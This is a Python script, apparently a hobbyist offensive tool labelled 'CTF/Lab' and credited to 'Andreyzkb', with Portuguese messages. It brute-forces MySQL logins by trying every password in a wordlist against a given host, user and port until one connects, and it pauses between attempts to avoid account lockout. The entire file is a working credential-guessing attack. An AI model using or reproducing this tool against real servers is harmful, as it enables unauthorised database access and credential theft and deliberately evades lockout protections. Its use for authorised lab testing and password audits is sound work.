#!/usr/bin/env python3
import mysql.connector
import argparse
import sys
import time

def banner():
    print(r"""
 __  __       ____  _      _____
|  \/  | ___ / ___|| |    |  ___|__  _ __ ___ ___
| |\/| |/ _ \\___ \| |    | |_ / _ \| '__/ __/ _ \
| |  | |  __/ ___) | |___ |  _| (_) | | | (_|  __/
|_|  |_|\___||____/|_____||_|  \___/|_|  \___\___/
    MySQL Brute Force - by Andreyzkb
""")

def parse_args():
    parser = argparse.ArgumentParser(description="MySQL brute force (CTF/Lab)")
    parser.add_argument("-u", "--user", required=True, help="Usuário MySQL")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist de senhas")
    parser.add_argument("-ip", "--ip", required=True, help="IP do alvo")
    parser.add_argument("-p", "--port", default=3306, type=int, help="Porta MySQL (default 3306)")
    parser.add_argument("-d", "--database", default=None, help="Database (opcional)")
    return parser.parse_args()

def try_login(host, port, user, password, database):
    try:
        conn = mysql.connector.connect(
            host=host,
            port=port,
            user=user,
            password=password,
            database=database,
            connection_timeout=3
        )
        if conn.is_connected():
            conn.close()
            return True
    except mysql.connector.Error:
        return False

def main():
    args = parse_args()
    banner()

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue

                print(f"[-] Testando: {password}")
                if try_login(args.ip, args.port, args.user, password, args.database):
                    print(f"\n[+] SENHA ENCONTRADA!")
                    print(f"    Usuário: {args.user}")
                    print(f"    Senha: {password}")
                    sys.exit(0)

                time.sleep(0.3)  # rate limit (evita lock)

    except FileNotFoundError:
        print("[!] Wordlist não encontrada.")
        sys.exit(1)

    print("\n[-] Nenhuma senha encontrada.")

if __name__ == "__main__":
    main()
